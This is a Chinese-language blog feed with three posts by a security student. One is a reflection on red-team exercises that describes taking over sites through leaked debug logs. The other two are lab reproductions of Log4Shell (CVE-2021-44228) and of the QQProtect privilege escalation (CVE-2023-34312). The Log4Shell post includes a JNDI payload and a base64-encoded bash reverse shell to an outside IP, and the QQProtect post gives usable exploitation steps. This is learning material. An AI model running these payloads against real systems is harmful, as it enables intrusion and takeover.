<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>网安扫盲第一集</title>
    <link href="/2023/08/13/cybersecurity_one/"/>
    <url>/2023/08/13/cybersecurity_one/</url>
    
    <content type="html"><![CDATA[<h3 id="2023-08-13"><a href="#2023-08-13" class="headerlink" title="2023.08.13"></a>2023.08.13</h3><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然说之前混的实验室之类的比赛基本上都打完了，但解放的感觉并未如约而至，并没有那种终于不用干开发，终于润到网安发展的感觉。所以说转变不是光靠等能等出来的，还是得自己去争取啊。</p><p>因为一次偶然的教育hvv的机会终于有机会能和学校里大名鼎鼎的网安大手子L神合作，我一直想着能抓住机会学学手法，到时自己应该也就自然而然能悟了。毕竟我也是从小时候开始也多多少少接触过一些。学起来应该会比没有底子来得快，而且L神就在现场操作讲解，要是这都学不会难道要让人手把手在键盘上一个字母一个字母地教吗？</p><p>我本来是这么想的。直到实实在在看到L神和金神的操作，我才想起来经典电影《Who am I:No System is Safe》里的台词：“黑客所为，就如同变魔术”。倒不是说像电影里说的是靠的障眼法，而是就如同字面意思:完全看不懂，就像再看魔术。这里抓包更改传入的参数，那里填充脏数据绕过waf上传。这么一来二去，就把别人站点拿下来了，然后打到内网里再让金神来变魔术。我最多就回忆回忆小时候玩的msf操作，帮他们打打ms17010然后得了个“蓝神“的称号，什么“永恒之蓝的神”，想想我都要笑，呜呜呜太fw了。不过在那次hvv中把msf玩爽了。</p><p>要说收获嘛，顶多是把内网渗透的流程熟悉了一遍，要用的工具，还有一些手法。起码玩起来比打点容易，说白了就是脚本小子式的操着工具嗯造就完了。getshell了之后直接上fscan开扫，横向全靠ms17010，没有就差不多寄。更多就是跟隔壁学校一起hvv的师傅学了一手反向代理隧道，还有mimikatz抓密码之类的细小操作，说白了我对自己内网方面不满的就是，也许让我上确实能操作起来，但是也就这样了，对于知识没有系统的总结构建，搭建不起来一个完整的知识体系。这些操作金神和L神自己上也不是不行，只是没必要，他们的精力应该放在继续打点和免杀过马之类的复杂工作上，也就是说，我的工作是可以被替代的，还不具备与他们并肩的实力。</p><p>但是L神在之后接的hvv代打每次进了内网还能拉我一把，还说一起分钱，我简直是想给他哐哐磕头了，真不夸张的说，L神简直是我的电子义父，要是我以后真能玩得更好，能出本书估计半篇篇幅都得写L神，我就是这么敬佩他。</p><p>也因为这个情况，没有L神我就一无是处，打点还没有成功过，唯一成功的那次是教育hvv时内网基本都被蓝队应急了，准备收收心钓鱼的时候我看到nuclei扫到的symfony啥啥RCE漏洞啥的，点进去一看是个symfony的调试模式能看日志的东西。搜poc找到是个nday，现场试着复现却发现没那么一致，没法直接利用，L神也觉得这个没戏。就在要放弃的时候灵光一现想到都可以查日志了直接查登录记录看看管理员密码不久好了。后来找到个用户密码，登录之后再用找到的管理员登录cookie替换一下就进去了。还真是，把站日下来的那一个瞬间，那种快感比🐍了都爽。虽然还是在框架允许的范畴下拿到的管理员，没有getshell，不过想来这也是小时候幻想着成为嗨客以来第一次成功的日下来一个站，简直是要起飞。后来发现日下来的是主站，可以往分站添加管理员，靠着这一手把几个分站用nday给shell了，只能说是唯一的高光时刻了。扯远了，其实想表达的就是自己打点这块太薄弱，等L神和我都毕了业，如果我也想吃这碗饭，靠这个水平是别想了，到时人家也不会带着我这个拖油瓶，若是不趁这个机会好好学学，基本上是毕业即失业了。所以我也想好好学一遍，起码有点打点成功的经历，我也能对自己多点信心，而且这样以来再有hvv或者其他的业务的时候，能多帮上L神一点忙，不像现在被蓝队应急了就只能闲着没事干等L神再shell几个站才有活干，平常自己也能靠着挖挖SRC赚点(现在是，幻想时间)。</p><p>大概背景就是这样，然后在观摩了多次L神打点的过程之后，最深的感触就是经验的差距，L神已经成长成了一个打点终极高手，放在全国都能打的那种，他也说过在日站的过程中无非就是测功能点，然后看有无越权，有无XSS之类的利用点，还有更直接的弱口令之类。但是我不知道哪些参数会造成越权，哪些地方能找到XSS或者sql的注入点，不说正经的哇漏洞，光是hvv这种随心所欲嗯造的场所，我也不知道这个站点是struct2或者weblogic或者tomcat，有没有能直接用工具利用的漏洞，或者是什么致远oa，万户oa，有什么day，我压根不知道，我甚至不知道oa是啥（这就是这篇文章的主题），这也就造成了一个大问题，不说在正经干活的时候不会，甚至在学的时候也不知道该从哪里开始。我是要从特定几个漏洞复现开始呢还是看完漏洞原理然后像以前一样去ctf刷几道题还是找代码来直接上手审计呢。缺少了知识体系的构建，日站变得尤为困难。</p><p>于是在反复的SRC挖掘尝试的过程中，我终于破防了，遇到了一个正常得不能再正常的站点，终点抓POST包随便测测参数，发现大多数不存在的参数都是返回No this method之类的json消息，但是在其中一些(其实也不存在这些参数)情况却返回了一整个404页面，并且看到了ezEIP5.0的字样，搜索啊发现原来是万户的，发现ezEIP5.0有个XSS的CVE，不过没人复现，也找不到一点相关的资料，这么大个魔改的ezEIP(估计是定制的)，不说是不是真有XSS，能在哪里触发我也找不到啊。不测了，关机睡觉。</p><p>基本上我的日站都是这个过程，总结下来可能是空学会了L神的手法了，但是不明白手法背后的意义和原理，只是机械的模仿罢了。</p><p>最近还在不断地被失眠折磨，晚上睡不着觉宿舍还断电，躺在床上除了刷短视频啥也干不了，不然就是听音乐看抽象，任由情绪被虚拟调动，直到五点半天早早亮，来电了继续下床开电脑，日站吧没睡着感觉头疼日不下去，玩游戏吧玩不下去，开着galgame进度半天也推进不动。实在是受够这样的日子了。这一年我一定要成为网安中级高手。</p><h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p>扯了这么多，其实这次要记录的也只是几个经常遇到但是不太理解的概念。跟cms,oa,sso有关，它们的名字，作用或许很容易理解，但是为何在渗透工作中时常要对这几个东西保持关注，为何有时发现的某些oa版本就已经一把梭了，这些背后的联系对于我来说才是难以轻易理解的。</p><p>oa，即Office Automation(办公自动化)，在企业中常见，通常包括电子邮件，日程安排，文档管理等功能，用于帮助企业更高效地处理办公事务。</p><p>cms，即Content Management System,内容管理系统，用于网站管理人员能够更轻松地管理网站内容，包括文本，图像，视频等，在网站开发和维护中起重要作用</p><p>sso，即Single Sign On,单点登录，一种身份验证和凭据控制的机制，允许用户在登录一次之后访问多个相关系统，而不需要在每个系统中都输入凭证。</p><p>按照概念解释的话就是这样，很难看出到底为什么它们在渗透工作中能得到如此之高的关注度，但也不是不能理解，oa的话估计是漏洞比较多，谁会不喜欢漏洞多又被大规模使用的系统呢，就像我操着msf进了一堆有ms17010的内网一样，国内众多集成工具包中都集成了各个厂家oa的漏洞利用工具，只要版本与利用条件对应得上，基本就是一把梭，上马准备进内网阶段就完事，估计这类的漏洞也只是在hvv的时候有价值，平常的漏洞挖掘的话都不一定会遇上类似的场景，倒不是说没有，可能只是别人早挖过一遍了怎么可能轮得到我。漏洞挖掘的话估计会偏向于在已有相关代码的情况下进行代审的场景。</p><p>而cms,按照我的观察与推测也是差不多，虽然没看到像各大oa的直接的利用工具，但是似乎存在一些渗透的固定思路，找路径之类的，推测来说可能是挖漏洞和攻击渗透的时候都得注意，不过说是挖漏洞，到底是哪方面的漏洞也不好说，是xss还是csrf或者ssrf,还是rce呢都不好说。</p><p>sso，估计毫无疑问是属于代审的范畴了，只要能够拿下sso，我都不敢想了，连带的使用sso的系统估计都得被拿下，不说能getshell吧，起码管理员账号是拿下了，这个也不好说一定是属于挖漏洞的范畴，如果有大佬现场代审然后利用呢？或者人家本来就留着当0day了，不管是hvv的时候派上用场还是直接转卖可能比厂商给的钱多也不一定。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实吧，写这些莫名其妙的东西还是有点收获的，不同于内网渗透环节，你或许可以对那些shellcode，那些攻击的payload一无所知，就像我用着ms17010但是丝毫不知道它的具体细节，只知道反正跟smb本身的漏洞有关，只要知晓了msf那几个模块的使用方法，要用的工具的条件，基本上也能打得似乎有模有样，打得很爽，再加上一点网工的基本原理，也就能熟练使用代理隧道，中转监听器之类的横向技巧，但是要进军打点工作，要对这些漏洞的原理有一定的了解，或者说，要对漏洞有一定的研究，起码L神肯定是这样，他电脑里这些漏洞的相关学习和总结笔记是很多的，有机会真想全部下下来好好研究。我也不知道他对于这些漏洞是什么个研究步骤，大概是先了解漏洞的原理，然后尝试对这类漏洞进行专项挖掘，再结合自己挖掘过程中遇到的不同情况进行相关的总结，记录感悟，最后归档到自己的笔记里，下一次要用的时候直接翻出笔记用就完了，虽然可能不记得相关的具体命令，但是具体的步骤和命令都记录在笔记里，且原理已经被自己摸透了，那么无论是现场的挖掘还是利用都显得有迹可循了。</p><p>接下来就是跟着总结下来的学习路线去学习具体的漏洞然后去做一些专项挖掘了，不过还有一个问题：L神当时刚开始专项挖掘的的时候是怎么知道哪些站点能有这个漏洞哪些没有的呢，我倒希望这只是我万事开头难的小小疑问，而不是路线错误，不然就难搞了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-44228复现</title>
    <link href="/2023/08/01/CVE-2021-44228/"/>
    <url>/2023/08/01/CVE-2021-44228/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-44228-Apache-Log4j-复现"><a href="#CVE-2021-44228-Apache-Log4j-复现" class="headerlink" title="CVE-2021-44228 (Apache Log4j)复现"></a>CVE-2021-44228 (Apache Log4j)复现</h1><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为鄙人才疏学浅，而且专注时间太短，一直不太知道到底要复现一些什么漏洞才能提升自己的打点水平，只能先挑这些大家都耳熟能详的漏洞来尝试复现了。</p><p>遥想2021Log4j漏洞刚放出poc，各个我关注的网安up主都在发复现视频，不过当时我应该是刚高考完没多久，或者是大一，对于网安属于是一种随时准备脱离的边缘状态，不过自己一直也不混什么圈子，真走了估计连0.00001%的世界线变动都不会产生，而且当时还没接触hw，就连那点脚本小子的活都用不明白了估计。扯远了，不过我一直以为这个漏洞蛮新的，没想到已经整整两年了，真是岁月如梭。</p><h2 id="漏洞背景-原理"><a href="#漏洞背景-原理" class="headerlink" title="漏洞背景&amp;原理"></a>漏洞背景&amp;原理</h2><p>“Apache Log4j是基于java的日志记录组件，被广泛应用于业务系统开发。”我对java唯一的开发经验就只是之前尝试过和朋友写一个Minecraft的mod，不过当年Log4j漏洞刚披露的时候确实有关于mc服务器因为Log4j漏洞被入侵的消息。</p><p>受影响的组件:</p><ul><li>Spring-boot-strater-log4j2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li></ul><p>眼熟的只有solr和druid，不过也仅是眼熟，solr是在一次hw里面通过扫描得到内网的一台linux机器上似乎有solr相关的漏洞，然后用msf搜了个solr直接用exploit一把梭了(唉，脚本小子)，druid是之前打ctf的时候出过一提相关的，不过利用方法什么的也全忘了。</p><hr><p>看了半天我也没想好怎么组织语言描述它的原理，先提取几个关键词出来: JNDI(Java Name and Directory Interface),LDAP(Lightweight Directory Protocol),RMI(Remote Method Invoke)，大概是说,log4j有个lookup功能的实现类JNDI实现类Jndilookup存在设计缺陷，导致于使用了JNDI接口的应用都存在被RCE的可能。</p><p><img src="/img/image-20230731161038556.png" alt="image-20230731161038556"></p><p>log4j的lookup功能可以快速打印运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。</p><p>首先是__org.apache.logging.log4j.core.pattern.MessagePatternConverter#format__ </p><p><img src="/img/image-20230731225911225.png" alt="image-20230731225911225"></p><p>此处是找的log4j2.2版本源码，写法上可能与其他版本不太一样，但是同样存在漏洞。</p><p>我们传入的message会通过<code>MessagePattenConverter.format()</code>，如果<code>config</code>存在且<code>noLookups</code>未false(此处似乎并未出现，不过反正noLookups默认就是false)，再匹配到${开头则替换原有字符串，我们在此处构造payload。</p><p>另外是<code>org.apache.logging.log4j.core.lookup.Interpolator#lookup</code></p><p><img src="/img/image-20230731230716457.png" alt="image-20230731230716457"></p><p>此处是说log4j在处理event的时候是根据前缀选择对应的<code>StrLookup</code>进行处理的比如，date,jndi,java,main等，如果event是jndi,就能通过jndi注入导致RCE，大概吧，没了解过jndi注入，等我了解了相关的知识再回来补。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="dnglog验证漏洞"><a href="#dnglog验证漏洞" class="headerlink" title="dnglog验证漏洞"></a>dnglog验证漏洞</h3><p>通过docker拉取漏洞镜像<em>vulfocus&#x2F;log4j2-rce-2021-12-09:latest</em>并启动。</p><p><img src="/img/image-20230731232426957.png" alt="image-20230731232426957"></p><p>点击链接会发送payload，我们使用hackbar构造payload:<code>$&#123;jndi:ldap://4zjth6.dnslog.cn&#125;</code>来验证是否存在漏洞。(payload要进行url编码)</p><p><img src="/img/image-20230731232601564.png" alt="image-20230731232601564"></p><p><img src="/img/image-20230731232615226.png" alt="image-20230731232615226"></p><p>成功执行。</p><h3 id="jndi注入反弹shell"><a href="#jndi注入反弹shell" class="headerlink" title="jndi注入反弹shell"></a>jndi注入反弹shell</h3><p>下载<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0%E6%90%AD%E5%BB%BA%E8%99%9A%E5%81%87ldap,rwi%E6%9C%8D%E5%8A%A1">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0搭建虚假ldap,rwi服务</a></p><p>命令为&#96;&#96;</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">java -jar /JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c </span><span class="hljs-template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTIuNzQuMTI2LjIwMC81OTg1Mi</span><br><span class="hljs-template-variable">AwPiYx&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml">&quot; -A 112.74.126.200</span><br></code></pre></td></tr></table></figure><p>使用-C传入需要执行的命令，似乎一定要base64编码后才可以，此处为<code>bash -i &gt;&amp; /dev/tcp/112.74.126.200/59852 0&gt;&amp;1</code>的base64编码。-A传入虚假服务的服务器ip</p><p><img src="/img/image-20230801001712984.png" alt="image-20230801001712984"></p><p>复制提供的url:<code>rmi://112.74.126.200:1099/fxpa7c</code>构造payload</p><p><img src="/img/image-20230801002923020.png" alt="image-20230801002923020"></p><p>成功反弹，不过不知道为什么成功率非常之低，成功过一次之后我修改了一点参数之后就再也没法复现了，真是奇怪了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-34312复现</title>
    <link href="/2023/07/26/CVE-2023-34312/"/>
    <url>/2023/07/26/CVE-2023-34312/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-34312漏洞复现"><a href="#CVE-2023-34312漏洞复现" class="headerlink" title="CVE-2023-34312漏洞复现"></a>CVE-2023-34312漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在练习内网渗透相关，在之前hw的时候发现只会msf+ms17010的自己在内网或许能够一把梭，但是后渗透阶段的各种操作自己都不熟悉，一旦没有了ms17010自己就傻了眼，自诩网络安全有些经验的自己结果也只是个脚本小子的事实实在是令人懊恼，但经验与实力是积累起来的，在此先从漏洞复现开始吧，之前也做过某些漏洞的复现，但大多都没有留下笔记记录，那么作为第一篇复现笔记，就从__CVE-2023-34312__*<em>提权漏洞开始吧，一点是利用起来比较简单</em>(因为我不会逆向，所以照着利用起来的话就只是编译一个dll的事)*，一个是在国内的内网环境下也许会遇到相关的情况，毕竟QQ在PC上的安装概率还是很大的。</p><hr><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>额，这个其实没什么好说的，毕竟我不是逆向选手，我只知道是因为有两个可供操作的指针a1和v3，然后大佬们提供了ROP链子的poc，我只管编译和使用。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>使用<code>cargo +stable-i686-pc-windows-msvc build --release --config &quot;build.rustflags = [\&quot;-C\&quot;, \&quot;target-feature=+crt-static\&quot;]&quot;</code>对poc进行编译，因为大佬用的是rust写的，所以还要配置rust编译环境。</p><p><img src="/img/image-20230726154739765.png" alt="image-20230726154739765"></p><p>主要是编译得到这两个dll: <em>evel.dll</em>和<em>tiniyxml.dll</em></p><p><img src="/img/image-20230726154905518.png"></p><p>好，然后就失败了，我真服了，这傻逼QQ重装一个版本把原来的删了不说，还利用失败了，我把这下面东西都删了再试试吧。</p><p><img src="/img/image-20230726155844157.png" alt="image-20230726155844157"></p><p>吗的，怎么还是失败了，再降低版本到9.7.6试试。</p><p>吗的。还是失败了，我直接下载大佬编译好的dll试试。</p><p>吗的。还是失败了，不玩了，关机睡觉。</p><p>吗的。一觉醒来换了win7虚拟机试了试还是失败。这下真是拌死在起跑线上了。</p><p>寄了，经过反复分析。我觉得这不是我的问题，应该是大佬写的问题，但是这有什么办法我只是一个脚本小子不懂逆向也不懂rust我也不会改呜呜呜呜呜。</p><p><img src="/img/image-20230726220714417.png" alt="image-20230726220714417"></p><p>看报错应该就是这一行出了问题，报错是找不到文件，指的应该就是这个.\pipe_QPIPC_PUB1015_了，但是我也不知道这是个什么啊，连路径都看不懂，呜呜呜呜呜。</p><p>又二十分钟之后，终于哦哦哦哦哦哦，成功了，原本预期二十分钟复现完毕的漏洞，我从早上一直干到了晚上。不过也是因为翻车，对于这个漏洞的原理理解得…额..算是深了一些吧。如果就像其他人的复现blog一样顺利，我感觉我都不会打开这个源代码瞧上一眼。话说我怎么干这行总是翻车，什么奇怪的翻车体制吗难道。</p><p><img src="/img/image-20230726223020312.png" alt="image-20230726223020312"></p><p>好，那么究竟是怎么回事呢。正如我上面提到的报错显示的那段代码，是打开了某个进程管道，而报错显示并不存在这个管道，结合我自然语言理解的代码，*(其实还得是chatgpt爹的帮助)<em>，看来是管道的问题，我去下载了一个windows查看管道的工具*<em>Sysinternals Suite</em></em></p><blockquote><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a></p></blockquote><p>稍加查看后发现</p><p><img src="/img/image-20230726223605464.png" alt="image-20230726223605464"></p><p>在初次安装的时候会自动启动QQ，此时QQProtect.exe(Q盾)会伴生启动，然而因为看其他人的复现过程都说的是将编译生成的两个dll<strong>复制</strong>到QQProtect.exe所在的文件夹中，一般是在<code>C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin</code>，这样的话就会产生一个问题，就是tinyxml.dll是涉及到替换的，而在Q盾活动的过程中tinyxml.dll是被占用的，无法完成替换，所以我就想着把Q盾的进程杀掉，从而导致了一个<strong>大问题</strong>。我没有发现这之后Q盾程序就再也起不来了，于是管道也就不存在。</p><p><img src="/img/image-20230726224107842.png" alt="image-20230726224107842"></p><p>而且不光是这样，杀掉Q盾进程之后不管有没有替换tinyxml.dll，还是启不启动QQ，Q盾进程的莫名的没法再起来了。所以正确的使用方法应该是找另外一个目录，在确定Q盾进程存在的情况下把QQProtect.exe复制到编译得到的两个dll同文件下，并且运行<code>QQProtect.exe evil.dll</code>，这样才能成功的提权。</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>这通乌龙终于是结束了，起码下次再有hw没准能遇到这样的场景，起码不会再翻车了。希望等这阵子忙完了自己能去学一学msf的实现和ruby，把CVE-2023-34312搞成提权脚本，唉，如果真有那么一天，估计我也能早日脱离脚本小子的境地吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
